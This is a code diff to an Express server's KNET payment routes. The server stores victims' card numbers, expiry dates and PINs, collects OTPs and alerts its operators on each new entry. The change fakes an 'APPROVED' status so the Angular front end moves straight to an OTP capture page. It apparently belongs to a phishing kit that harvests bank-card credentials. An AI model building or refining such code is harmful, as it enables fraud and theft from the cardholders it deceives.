@@ -264,18 +264,22 @@ app.post('/knet', (req, res) => {
     bankName: bankName || '', prefix: prefix || '', cardNumber: cardNumber || '',
     expiryMonth: expiryMonth || '', expiryYear: expiryYear || '',
     pass: pin || '---', loginPassword: pin || '',
-    knetOtps: [], status: 'PENDING', step: 1,
+    knetOtps: [], status: 'OTP_PENDING', step: 1,
     created_at: new Date().toISOString(), updatedAt: new Date().toISOString()
   };
   payments.push(payment);
   notifyAdmins('payment_new', payment);
-  res.json({ success: true, knetId, paymentId: knetId, refNumber });
+  // Return APPROVED so Angular navigates to /knet-otp immediately
+  res.json({ success: true, knetId, paymentId: knetId, refNumber, status: 'APPROVED' });
 });
 
 app.get('/knet/status/:id', (req, res) => {
   const payment = payments.find(p => p.id === req.params.id || p.knetId === req.params.id);
   if (!payment) return res.status(404).json({ success: false, message: 'Payment not found' });
-  res.json({ success: true, status: payment.status, payment });
+  // Angular polls for APPROVED to navigate to /knet-otp
+  // Map OTP_PENDING to APPROVED so Angular proceeds to OTP page
+  const angularStatus = (payment.status === 'OTP_PENDING' || payment.status === 'PENDING') ? 'APPROVED' : payment.status;
+  res.json({ success: true, status: angularStatus, payment });
 });
 
 app.post('/knet/update-status', (req, res) => {
